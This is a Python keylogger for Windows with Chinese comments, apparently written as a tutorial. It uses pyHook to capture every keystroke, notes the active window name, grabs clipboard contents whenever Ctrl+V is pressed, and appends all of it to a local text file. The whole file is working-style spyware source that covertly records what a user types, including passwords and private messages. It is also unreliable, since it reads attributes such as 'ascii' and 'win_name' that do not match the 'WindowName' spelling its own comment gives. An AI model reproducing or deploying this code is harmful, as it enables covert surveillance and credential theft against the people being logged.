# _*_ coding:utf-8 _*_
#!/usr/bin/python

#pyHook需安装,下载whl
import pyHook
#调用windows组件,用于继续传递事件消息,自带的模块
import pythoncom
#引入windows粘贴板,自带的模块
import win32clipboard


key_window_name=None   #定义按键事件的窗口名称全局变量
#0.先定义一个事件函数
last_key=None
def onKeyboardEvent(event):   #定义键盘的回调函数
    #print(event.MessageName)
    # print(chr(event.Ascii))
    # print(event.WindowName)  #注意WindowName 无s
    #事件的其他属性:...

    global last_key
    #判断是否为复制粘贴的快捷键
    if  last_key=='Lcontrol' and chr(event.ascii)=='V':    #获得粘贴板的内容给value
        win32clipboard.OpenClipboard() #打开粘贴板
        value=win32clipboard.GetClipboardData() #获取数据
        win32clipboard.CloseClipboard() #关闭粘贴板

    #判断按键是否为字符按键,排除ctrl,shift等
    elif event.ascii > 32 and 127 > event.ascii:
        value =chr(event.ascii)
    else:
        value='(keys:%s)'% str(chr(event.ascii))

    last_key=chr(event.ascii)


    #窗口的转换打印
    global key_window_name

    if key_window_name!=event.win_name:
        key_window_name=event.win_name     #赋值最新的窗口
        with open(u'键盘记录.txt','a+') as kf:
            kf.write('\n\n')
            kf.writelines(event.win_name)
            kf.write('\n')
            kf.write(value)
    else:
        with open(u'键盘记录.txt','a+') as kf:
            kf.write(value)

    return True



def main():
    #1.创建一个钩子管理器
    hm=pyHook.HookManager()  #hm 为勾子管理器

    #2.绑定到勾子管理器
    hm.KeyDown=onKeyboardEvent  #hm的键盘按下事件与回调函数绑定

    #3.监听键盘事件
    hm.HookKeyboard()    #调用方法开始监听

    #4.消息,事件继续传递下去
    pythoncom.PumpMessages()

if __name__=='__main__':
    main()